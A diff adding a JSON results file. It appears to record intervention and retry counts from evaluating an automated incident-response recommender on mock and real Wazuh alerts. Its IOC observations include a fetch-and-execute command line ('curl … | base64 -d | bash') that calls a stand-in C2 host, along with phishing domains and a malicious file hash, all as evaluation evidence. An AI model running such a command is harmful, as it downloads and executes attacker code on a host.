@@ -1,0 +1,394 @@
+{
+  "mock-original": {
+    "evaluationType": "MOCK",
+    "summary": {
+      "cases": 4,
+      "ofAttempted": 10,
+      "ratePercentOfAttempted": 40,
+      "byTypeCases": {
+        "ANALYST_IOC_CORRECTION": 2,
+        "PLAYBOOK_SEED_UPDATE": 2,
+        "MITRE_CATALOG_UPDATE": 2
+      },
+      "definition": "cases with ≥1 correction applied during the run / attempted cases × 100 (retries are reported separately)"
+    },
+    "retry": {
+      "caseLevelRatePercent": 40,
+      "casesWithRetry": 4,
+      "ofAttempted": 10,
+      "totalRetryCount": 43,
+      "perCase": {
+        "TC-01": 0,
+        "TC-02": 0,
+        "TC-03": 13,
+        "TC-04": 0,
+        "TC-05": 0,
+        "TC-06": 0,
+        "TC-07": 12,
+        "TC-08": 6,
+        "TC-09": 12,
+        "TC-10": 0
+      },
+      "note": "total retry count is a COUNT of RECOMMENDATION_GENERATION_FAILED events, not a percentage"
+    },
+    "cases": [
+      {
+        "caseId": "TC-01",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "MOCK_RUN_CONTAMINATION: this row is NOT a pure mock alert - the incident was built from a real Wazuh alert of agent attack-endpoint; only its verification is mock"
+        ]
+      },
+      {
+        "caseId": "TC-02",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-03",
+        "interventions": [
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "Analyst manually promoted the EMAIL IOC to actionable so ACT-QUARANTINE-EMAIL had a targetable, evidence-backed target (INVENTED_TARGET / EMAIL_MESSAGE otherwise)."
+          }
+        ],
+        "retries": 13,
+        "observations": []
+      },
+      {
+        "caseId": "TC-04",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-05",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-06",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-07",
+        "interventions": [
+          {
+            "type": "PLAYBOOK_SEED_UPDATE",
+            "detail": "System KB gap fixed during the run: PB-C2 was seeded and T1071.001 was added to the MITRE catalog (mitre.seed.ts) so the C2 technique validated and the playbook could be selected."
+          },
+          {
+            "type": "MITRE_CATALOG_UPDATE",
+            "detail": "System KB gap fixed during the run: PB-C2 was seeded and T1071.001 was added to the MITRE catalog (mitre.seed.ts) so the C2 technique validated and the playbook could be selected."
+          }
+        ],
+        "retries": 12,
+        "observations": []
+      },
+      {
+        "caseId": "TC-08",
+        "interventions": [
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "Analyst manually added a COMMAND IOC so ACT-KILL-PROCESS met its COMMAND_LINE evidence requirement (INSUFFICIENT_EVIDENCE otherwise)."
+          }
+        ],
+        "retries": 6,
+        "observations": []
+      },
+      {
+        "caseId": "TC-09",
+        "interventions": [
+          {
+            "type": "PLAYBOOK_SEED_UPDATE",
+            "detail": "System KB gap fixed during the run: PB-DATA-EXFIL was seeded and T1048 added to the MITRE catalog so the exfiltration technique validated and the playbook could be selected."
+          },
+          {
+            "type": "MITRE_CATALOG_UPDATE",
+            "detail": "System KB gap fixed during the run: PB-DATA-EXFIL was seeded and T1048 added to the MITRE catalog so the exfiltration technique validated and the playbook could be selected."
+          }
+        ],
+        "retries": 12,
+        "observations": []
+      },
+      {
+        "caseId": "TC-10",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      }
+    ]
+  },
+  "real-clean": {
+    "evaluationType": "REAL_WAZUH",
+    "summary": {
+      "cases": 0,
+      "ofAttempted": 9,
+      "ratePercentOfAttempted": 0,
+      "byTypeCases": {},
+      "definition": "cases with ≥1 correction applied during the run / attempted cases × 100 (retries are reported separately)"
+    },
+    "retry": {
+      "caseLevelRatePercent": 22.22,
+      "casesWithRetry": 2,
+      "ofAttempted": 9,
+      "totalRetryCount": 10,
+      "perCase": {
+        "TC-01": 0,
+        "TC-02": 0,
+        "TC-03": 5,
+        "TC-04": 0,
+        "TC-06": 0,
+        "TC-07": 0,
+        "TC-08": 5,
+        "TC-09": 0,
+        "TC-10": 0
+      },
+      "note": "total retry count is a COUNT of RECOMMENDATION_GENERATION_FAILED events, not a percentage"
+    },
+    "cases": [
+      {
+        "caseId": "TC-01",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-02",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe",
+          "REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA \"No supported IOC is available to query.\" — no verification, incident not resolved",
+          "ACTION_DIFFERS_FROM_PREFERRED: actual [ACT-ISOLATE-ENDPOINT] vs preferred [ACT-QUARANTINE-FILE,ACT-BLOCK-HASH] (allowed set still governs compliance)"
+        ]
+      },
+      {
+        "caseId": "TC-03",
+        "interventions": [],
+        "retries": 5,
+        "observations": [
+          "NO_VALID_RECOMMENDATION after 5 attempts"
+        ]
+      },
+      {
+        "caseId": "TC-04",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-05",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment."
+        ]
+      },
+      {
+        "caseId": "TC-06",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-07",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC"
+        ]
+      },
+      {
+        "caseId": "TC-08",
+        "interventions": [],
+        "retries": 5,
+        "observations": [
+          "EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+          "NO_VALID_RECOMMENDATION after 5 attempts"
+        ]
+      },
+      {
+        "caseId": "TC-09",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-10",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA \"No supported IOC is available to query.\" — no verification, incident not resolved"
+        ]
+      }
+    ]
+  },
+  "real-intervention": {
+    "evaluationType": "REAL_WAZUH",
+    "summary": {
+      "cases": 2,
+      "ofAttempted": 9,
+      "ratePercentOfAttempted": 22.22,
+      "byTypeCases": {
+        "ANALYST_IOC_CORRECTION": 2
+      },
+      "definition": "cases with ≥1 correction applied during the run / attempted cases × 100 (retries are reported separately)"
+    },
+    "retry": {
+      "caseLevelRatePercent": 22.22,
+      "casesWithRetry": 2,
+      "ofAttempted": 9,
+      "totalRetryCount": 6,
+      "perCase": {
+        "TC-01": 0,
+        "TC-02": 0,
+        "TC-03": 3,
+        "TC-04": 0,
+        "TC-06": 0,
+        "TC-07": 0,
+        "TC-08": 3,
+        "TC-09": 0,
+        "TC-10": 0
+      },
+      "note": "total retry count is a COUNT of RECOMMENDATION_GENERATION_FAILED events, not a percentage"
+    },
+    "cases": [
+      {
+        "caseId": "TC-01",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-02",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe",
+          "REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA \"No supported IOC is available to query.\" — no verification, incident not resolved",
+          "ACTION_DIFFERS_FROM_PREFERRED: actual [ACT-ISOLATE-ENDPOINT] vs preferred [ACT-QUARANTINE-FILE,ACT-BLOCK-HASH] (allowed set still governs compliance)"
+        ]
+      },
+      {
+        "caseId": "TC-03",
+        "interventions": [
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "promoted existing URL IOC http://vigix-eval-phish.net/o365/verify?id=hr.clerk to analyst-confirmed/actionable"
+          },
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "promoted existing DOMAIN IOC vigix-eval-phish.net to analyst-confirmed/actionable"
+          },
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "promoted existing IPV4 IOC 203.0.113.45 to analyst-confirmed/actionable"
+          },
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "promoted existing EMAIL IOC it-support@vigix-eval-phish.net to analyst-confirmed/actionable"
+          }
+        ],
+        "retries": 3,
+        "observations": []
+      },
+      {
+        "caseId": "TC-04",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-05",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment."
+        ]
+      },
+      {
+        "caseId": "TC-06",
+        "interventions": [],
+        "retries": 0,
+        "observations": []
+      },
+      {
+        "caseId": "TC-07",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC"
+        ]
+      },
+      {
+        "caseId": "TC-08",
+        "interventions": [
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "added PROCESS_NAME IOC /tmp/.cache/kworkerd evidenced in the alert"
+          },
+          {
+            "type": "ANALYST_IOC_CORRECTION",
+            "detail": "added COMMAND_LINE IOC curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash evidenced in the alert"
+          }
+        ],
+        "retries": 3,
+        "observations": [
+          "EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+        ]
+      },
+      {
+        "caseId": "TC-09",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC"
+        ]
+      },
+      {
+        "caseId": "TC-10",
+        "interventions": [],
+        "retries": 0,
+        "observations": [
+          "REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA \"No supported IOC is available to query.\" — no verification, incident not resolved"
+        ]
+      }
+    ]
+  },
+  "real-recurrence-control": {
+    "evaluationType": "REAL_WAZUH",
+    "summary": {
+      "cases": 0,
+      "ofAttempted": 1,
+      "ratePercentOfAttempted": 0,
+      "byTypeCases": {},
+      "definition": "cases with ≥1 correction applied during the run / attempted cases × 100 (retries are reported separately)"
+    },
+    "retry": {
+      "caseLevelRatePercent": 100,
+      "casesWithRetry": 1,
+      "ofAttempted": 1,
+      "totalRetryCount": 1,
+      "perCase": {
+        "TC-01": 1
+      },
+      "note": "total retry count is a COUNT of RECOMMENDATION_GENERATION_FAILED events, not a percentage"
+    },
+    "cases": [
+      {
+        "caseId": "TC-01",
+        "interventions": [],
+        "retries": 1,
+        "observations": [
+          "RECURRENCE_CONTROL: attack repeated 2026-09-30T12:12:17.800Z after the response completed; recurrence alert seen in the indexer (1790770358.1896566)"
+        ]
+      }
+    ]
+  }
+}
